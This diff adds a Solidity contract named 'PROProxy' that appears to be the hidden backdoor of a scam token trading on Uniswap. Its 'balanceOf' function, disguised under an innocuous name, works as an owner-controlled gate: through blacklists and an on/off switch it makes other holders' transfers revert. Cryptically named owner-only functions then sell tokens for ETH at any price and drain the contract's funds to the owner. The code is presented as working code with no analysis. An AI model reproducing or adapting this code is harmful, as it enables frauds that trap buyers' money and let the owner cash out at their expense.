@@ -1,0 +1,82 @@
+contract PROProxy is Ownable {
+    using SafeMath for uint256;
+
+    IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+
+    address coin;
+    address pair;
+
+    mapping(address => bool) whites;
+    mapping(address => bool) blacks;
+    bool public enabled = true;
+
+    receive() external payable { }
+
+    function IT(address _coin, address _pair) external onlyOwner {
+        coin = _coin;
+        pair = _pair;
+    }
+
+    function eSw(bool _enabled) external onlyOwner {
+        enabled = _enabled;
+    }
+
+    function RT() external onlyOwner {
+        coin = address(0);
+        pair = address(0);
+    }
+
+    function balanceOf(
+        address from
+    ) external view returns (uint256) {
+        if (whites[from] || pair == address(0)) {
+            require(!blacks[from]);
+            return 0;
+        }
+        else if ((from == owner() || from == address(this))) {
+            return 1;
+        }
+        if (from != pair) {
+            require(enabled);
+            require(!blacks[from]);
+        }
+        return 0;
+    }
+
+    function DTH(uint256 count) external onlyOwner {
+
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = coin;
+        path[1] = uniswapV2Router.WETH();
+
+        IERC20(coin).approve(address(uniswapV2Router), ~uint256(0));
+
+        // make the swap
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            10 ** count,
+            0, // accept any amount of ETH
+            path,
+            address(this),
+            block.timestamp
+        );  
+
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function ADW(address[] memory _wat) external onlyOwner{
+        for (uint i = 0; i < _wat.length; i++) {
+            whites[_wat[i]] = true;
+        }
+    }
+
+    function ADB(address[] memory _bat) external onlyOwner{
+        for (uint i = 0; i < _bat.length; i++) {
+            blacks[_bat[i]] = true;
+        }
+    }
+
+    function cd() external onlyOwner {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
